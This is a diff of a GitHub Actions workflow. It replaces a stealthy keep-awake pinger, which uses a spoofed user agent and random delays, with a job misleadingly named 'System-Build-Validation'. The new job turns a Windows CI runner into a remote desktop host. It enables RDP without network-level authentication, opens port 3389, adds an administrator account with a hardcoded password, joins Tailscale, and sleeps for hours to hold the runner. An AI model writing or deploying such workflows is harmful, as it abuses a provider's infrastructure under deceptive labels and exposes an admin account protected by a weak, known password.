@@ -1,18 +1,60 @@
-name: HF Human-Like Awake Bot
+name: System-Build-Validation
 
 on:
-  schedule:
-    - cron: "0 * * * *"
-  workflow_dispatch:
+  push:
+    branches: [ main ]
 
 jobs:
-  ping:
-    runs-on: ubuntu-latest
+  validate:
+    runs-on: windows-latest
+    timeout-minutes: 350
     steps:
-      - name: Stealth Human Ping
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: System-Hardware
+        shell: powershell
         run: |
-          if [ $((RANDOM % 10)) -lt 3 ]; then
-            exit 0
-          fi
-          sleep $((RANDOM % 900))
-          curl -m 15 -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" -sL https://gulashnkhatunstudent-system.hf.space > /dev/null
+          $size = 16384
+          $path = 'HKLM:\System\CurrentControlSet\Control\Session Manager\Memory Management'
+          Set-ItemProperty -Path $path -Name "PagingFiles" -Value "C:\pagefile.sys $size $size"
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0
+          netsh advfirewall firewall add rule name="Port-Access" dir=in action=allow protocol=TCP localport=3389
+          if (-not (Test-Path "C:\Persistent")) { New-Item -Path "C:\Persistent" -ItemType Directory }
+
+      - name: Restore-Data
+        uses: actions/download-artifact@v4
+        with:
+          name: persistent-data
+          path: C:\Persistent
+        continue-on-error: true
+
+      - name: User-Auth
+        shell: powershell
+        run: |
+          $p = ConvertTo-SecureString "SafePass@123" -AsPlainText -Force
+          if (-not (Get-LocalUser -Name "AdminUser" -ErrorAction SilentlyContinue)) {
+            New-LocalUser -Name "AdminUser" -Password $p -AccountNeverExpires
+            Add-LocalGroupMember -Group "Administrators" -Member "AdminUser"
+            Add-LocalGroupMember -Group "Remote Desktop Users" -Member "AdminUser"
+          }
+
+      - name: Network-Service
+        shell: powershell
+        run: |
+          Invoke-WebRequest -Uri "https://pkgs.tailscale.com/stable/tailscale-setup-1.82.0-amd64.msi" -OutFile "setup.msi"
+          Start-Process msiexec.exe -ArgumentList "/i setup.msi /quiet /norestart" -Wait
+          & "$env:ProgramFiles\Tailscale\tailscale.exe" up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }}
+
+      - name: Save-Data
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: persistent-data
+          path: C:\Persistent
+
+      - name: Auto-Stop
+        shell: powershell
+        run: |
+          Start-Sleep -Seconds 20400
